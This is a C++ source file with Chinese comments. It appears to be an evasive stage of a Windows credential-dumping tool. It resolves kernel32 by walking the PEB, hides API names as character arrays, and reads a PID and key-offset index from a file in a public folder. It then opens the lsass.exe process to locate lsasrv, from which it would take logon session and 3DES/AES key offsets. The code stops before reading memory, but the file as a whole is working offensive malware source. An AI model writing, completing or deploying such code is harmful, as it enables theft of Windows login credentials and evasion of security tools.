#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

typedef
FARPROC
(NTAPI* PNT_GetProcAddress)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

typedef
HMODULE
(NTAPI* PNT_LoadLibraryA)(
    LPCSTR lpLibFileName
    );

typedef
HANDLE
(NTAPI* PNT_CreateFileA)(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
    );

typedef
HFILE
(NTAPI* PNT_OpenFile)(
    LPCSTR     lpFileName,
    LPOFSTRUCT lpReOpenBuff,
    UINT       uStyle
    );

typedef
BOOL
(NTAPI* PNT_ReadFile)(
    HANDLE       hFile,
    LPVOID       lpBuffer,
    DWORD        nNumberOfBytesToRead,
    LPDWORD      lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
    );

typedef
HANDLE
(NTAPI* PNT_OpenProcess)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
    );

typedef
BOOL
(NTAPI* PNT_EnumProcessModules)(
    HANDLE  hProcess,
    HMODULE* lphModule,
    DWORD   cb,
    LPDWORD lpcbNeeded
    );

typedef
DWORD
(NTAPI* PNT_GetModuleFileNameExA)(
    HANDLE  hProcess,
    HMODULE hModule,
    LPSTR   lpFilename,
    DWORD   nSize
    );


#define TABLE_LENGTH 1024
#define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)
  
inline LPVOID get_func_by_name(LPVOID module, char* func_name)
{
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (!exportsDir->VirtualAddress) {
        return nullptr;
    }

    DWORD expAddr = exportsDir->VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
    SIZE_T namesCount = exp->NumberOfNames;

    DWORD funcsListRVA = exp->AddressOfFunctions;
    DWORD funcNamesListRVA = exp->AddressOfNames;
    DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;

    //go through names:
    for (SIZE_T i = 0; i < namesCount; i++) {
        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));

        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
        size_t k;
        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
            if (func_name[k] != curr_name[k]) break;
        }
        if (func_name[k] == 0 && curr_name[k] == 0) {
            //found
            return (BYTE*)module + (*funcRVA);
        }
    }
    return nullptr;
}


inline bool _compare_kernel32_name(WORD len, WCHAR* dll_name) {
    // 我们只需要定位kernel32，直接作为char处理即可
    // wchar的话，对于英文字符串，就是一个char一个0，结束符为两个0
    // len/2就是实际长度（不包括\0）,kernel32.dll长度就是12
    char DTwew[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    if (len / 2 != 12)return false;
    for (int i = 0; i < len / 2; i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != DTwew[i])return false;
    }
    return true;
}


inline bool _compare_psapi_name(WORD len, WCHAR* dll_name) {
    // 我们只需要定位kernel32，直接作为char处理即可
    // wchar的话，对于英文字符串，就是一个char一个0，结束符为两个0
    // len/2就是实际长度（不包括\0）,kernel32.dll长度就是12
    char DTwew[] = { 'p','s','a','p','i','.','d','l','l',0 };
    if (len / 2 != 9)return false;
    for (int i = 0; i < len / 2; i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != DTwew[i])return false;
    }
    return true;
}


inline bool _compare_lsass_name(char* dll_name) {
    // char oyctO[] = { 'l','s','a','s','s','.','e','x','e',0 }; 
    char oyctO[] = { 'i','m','m','3','2','.','d','l','l',0 };
    for (int i = 0; (dll_name[i] != 0) && (i < 9); i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != oyctO[i])return false;
    }
    return true;
}


inline bool _compare_lsasrv_name(char* dll_name) {
    // char zGlRm[] = { 'l','s','a','s','r','v','.','d','l','l',0 }; 
    char zGlRm[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    // for (int i = 0; (dll_name[i] != 0) && (i < 10); i++) {
    for (int i = 0; (dll_name[i] != 0) && (i < 12); i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != zGlRm[i])return false;
    }
    return true;
    //TO_LOWERCASE
}


int main(int argc, char* argv[]) {
    DWORD _offset_table[TABLE_LENGTH][3] = {
        {0x32BC3,0x39E5C,0x9E36E},
        {0x1FA63,0x395DC,0x8CA6C}
    };


    // 读取gs寄存器的值获取到当前进程的peb
    DWORD64 _peb = __readgsqword(0x60);
    // 往后偏移0x18得到&ldr
    DWORD64 _p_ldr = _peb + 0x18;
    // 取出ldr的地址
    DWORD64 _ldr = *(reinterpret_cast<DWORD64*>(_p_ldr));
    // 往后偏移0x10得到&InLoadOrderModuleList
    DWORD64 _p_InLoadOrderModuleList = _ldr + 0x10;
    // 取出InLoadOrderModuleList地址
    DWORD64 _InLoadOrderModuleList = *(reinterpret_cast<DWORD64*>(_p_InLoadOrderModuleList));
    // 这个地址是_LDR_DATA_TABLE_ENTRY的第一个字段的地址，也就是_LDR_DATA_TABLE_ENTRY的地址
    // 记录下这个地址，然后开始遍历，直到flink=记录下来的地址
    // 遍历module
    // 实际测试发现这个链表有一个头结点，头结点中不保存实际数据，除了flink和blink，其余字段都是空的
    // 我们要在遍历过程中对dll名称进行对比，由于我们要编写shellcode，所以不能使用任何库函数，只能自己实现

    DWORD64 _entry_addr = _InLoadOrderModuleList;
    DWORD64 _kernel32_base_addr = 0; 
    DWORD64 _psapi_base_addr = 0;
    while (1) {
        // 获取dll名称，0x58
        DWORD64 _dll_name = _entry_addr + 0x58;
        UNICODE_STRING* dll_name = reinterpret_cast<UNICODE_STRING*>(_dll_name);
        //wprintf(L"dll name: %s\n", dll_name->Buffer);
        // 获取dllbase地址，0x30
        DWORD64 _p_dll_base = _entry_addr + 0x30;
        DWORD64 _dll_base = *(reinterpret_cast<DWORD64*>(_p_dll_base));
        //printf("base address: %p\n", reinterpret_cast<DWORD64*>(_dll_base));

        if ((dll_name->Length != 0) && (_compare_kernel32_name(dll_name->Length, dll_name->Buffer))) {
            _kernel32_base_addr = _dll_base;
        }
        if ((dll_name->Length != 0) && (_compare_psapi_name(dll_name->Length, dll_name->Buffer))) {
            _psapi_base_addr = _dll_base;
        }
        // 获取flink
        _entry_addr = *(reinterpret_cast<DWORD64*>(_entry_addr));
        if (_InLoadOrderModuleList == _entry_addr) break;

    }
    //if (_kernel32_base_addr) {
    //    printf("kernel32.dll located, base address: %p\n", reinterpret_cast<DWORD64*>(_kernel32_base_addr));
    //}

    // 获取到kernel32的基地址之后需要获取其导出表，来定位我们需要用到的api
    // 我们需要解析kernel32.dll的PE结构
    // 这里我直接用了网上现成的代码
    // 把kernel32的基地址传上去，把想要获取的函数名称传上去即可
    char SYPRp[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
    VOID* _LoadLibraryA_addr = get_func_by_name(reinterpret_cast<LPVOID>(_kernel32_base_addr), SYPRp);
    char oloeS[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
    VOID* _GetProcAddress_addr = get_func_by_name(reinterpret_cast<LPVOID>(_kernel32_base_addr), oloeS);


    PNT_LoadLibraryA NT_LoadLibraryA = (PNT_LoadLibraryA)_LoadLibraryA_addr;
    PNT_GetProcAddress NT_GetProcAddress = (PNT_GetProcAddress)_GetProcAddress_addr;

    // 从文件中读取数组索引值，获取相关符号的偏移量

    // 首先要从kernel32中获取CreateFileA/ReadFile
    char LeyCa[] = { 'C','r','e','a','t','e','F','i','l','e','A',0 };
    PNT_CreateFileA NT_CreateFileA = (PNT_CreateFileA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, LeyCa);
    char iWLdo[] = { 'R','e','a','d','F','i','l','e',0 };
    PNT_ReadFile NT_ReadFile = (PNT_ReadFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, iWLdo);

    // 获取文件句柄
    HANDLE hFile = NT_CreateFileA("C:\\users\\public\\ili6ao",               // file to open
        GENERIC_READ,          // open for reading
        FILE_SHARE_READ,       // share for reading
        NULL,                  // default security
        OPEN_EXISTING,         // existing file only
        FILE_ATTRIBUTE_NORMAL, // normal file
        NULL);
    if (INVALID_HANDLE_VALUE == hFile)  return 0;
    // 读取文件
    char _buffer[11] = { 0 };
    DWORD out = 0;
    if (NT_ReadFile(hFile,
        _buffer,
        10,
        &out,
        NULL
    ) == FALSE) 
        return 0;

    // 当前情况下，我们的table长度不超过100，就算以后也大概率不会超过1000，所以
    // 我按照3位数进行处理
    DWORD _index = (_buffer[0] - '0') * 100 + (_buffer[1] - '0') * 10 + (_buffer[2] - '0');
    DWORD _logon_session_list_offset = _offset_table[_index][0];
    DWORD _3des_key_offset = _offset_table[_index][1];
    DWORD _aes_key_offset = _offset_table[_index][2];

    // 剩下的7位，是lsass.exe进程的PID
    DWORD _lsass_pid =  (_buffer[3] - '0') * 1000000 + (_buffer[4] - '0') * 100000 +
                        (_buffer[5] - '0') * 10000 + (_buffer[6] - '0') * 1000 +
                        (_buffer[7] - '0') * 100 + (_buffer[8] - '0') * 10 +
                        (_buffer[9] - '0');


    // printf("%d\t%d\t%d\n", _logon_session_list_offset, _3des_key_offset, _aes_key_offset);

    // 下面我们需要获取lsass.exe进程的句柄
    // DCOM服务进程默认打开SeDebugPrivilege
    char XhHaj[] = { 'O','p','e','n','P','r','o','c','e','s','s',0 };
    PNT_OpenProcess NT_OpenProcess = (PNT_OpenProcess)NT_GetProcAddress((HMODULE)_kernel32_base_addr, XhHaj);
    HANDLE _lsass_handle = NT_OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, _lsass_pid);

    if (INVALID_HANDLE_VALUE == _lsass_handle)  return 0;

    HMODULE lsassDll[1024];
    DWORD bytesReturned;
    char modName[50] = { 0 };
    char* lsass = NULL, * lsasrv = NULL;

    // EnumProcessModules和GetModuleFileNameExA需要从psapi.dll中获取
    HMODULE _psapi_module;
    if (!_psapi_base_addr) {
        char ipIdK[] = { 'p','s','a','p','i','.','d','l','l',0 };
        _psapi_module = NT_LoadLibraryA(ipIdK);
    }
    else 
        _psapi_module = (HMODULE)_psapi_base_addr;

    char DmSrn[] = { 'E','n','u','m','P','r','o','c','e','s','s','M','o','d','u','l','e','s',0 };
    PNT_EnumProcessModules NT_EnumProcessModules = (PNT_EnumProcessModules)NT_GetProcAddress(_psapi_module, DmSrn);

    char ezeVC[] = { 'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','E','x','A',0 };
    PNT_GetModuleFileNameExA NT_GetModuleFileNameExA = (PNT_GetModuleFileNameExA)NT_GetProcAddress(_psapi_module, ezeVC);
     
    if (NT_EnumProcessModules(_lsass_handle, lsassDll, sizeof(lsassDll), &bytesReturned)) {

        // For each DLL address, get its name so we can find what we are looking for
        for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {
            NT_GetModuleFileNameExA(_lsass_handle, lsassDll[i], modName, sizeof(modName));

            // Find DLL's we want to hunt for signatures within
            if(_compare_lsass_name(modName)){
                lsass = (char*)lsassDll[i];
            }
            else if (_compare_lsasrv_name(modName)) {
                lsasrv = (char*)lsassDll[i];
            }
        }
    }

    if ((!lsass) || (!lsasrv)) {
        // 有任意一个模块的地址获取失败，就不用往下进行了
        return 0;
    }



    return 0;
}
